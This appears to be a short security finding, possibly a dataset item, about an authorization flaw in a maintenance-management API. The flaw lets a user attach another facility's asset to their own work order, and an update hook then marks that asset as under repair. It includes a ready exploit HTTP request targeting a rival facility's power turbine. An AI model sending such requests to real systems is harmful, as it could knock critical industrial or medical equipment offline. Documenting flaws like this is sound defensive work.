diagnosis: While the work order route ensures that the user owns the WorkOrder being edited, it accepts an unvalidated assetId in the request body. A Sequelize beforeUpdate hook executes a cross-model side effect on the Asset model, setting its operational status to 'UNDER_REPAIR'. An attacker can link high-value machinery or medical equipment belonging to rival facilities to their work order, causing critical industrial assets to be marked offline.
exploit_request:
PUT /api/work-orders/wo_user_own_102 HTTP/1.1
Host: cmms.industrialops.net:8107
Cookie: session_auth=contractor_session
Content-Type: application/json

{"assetId": "asset_power_turbine_facility_b", "description": "Scheduled inspection"}
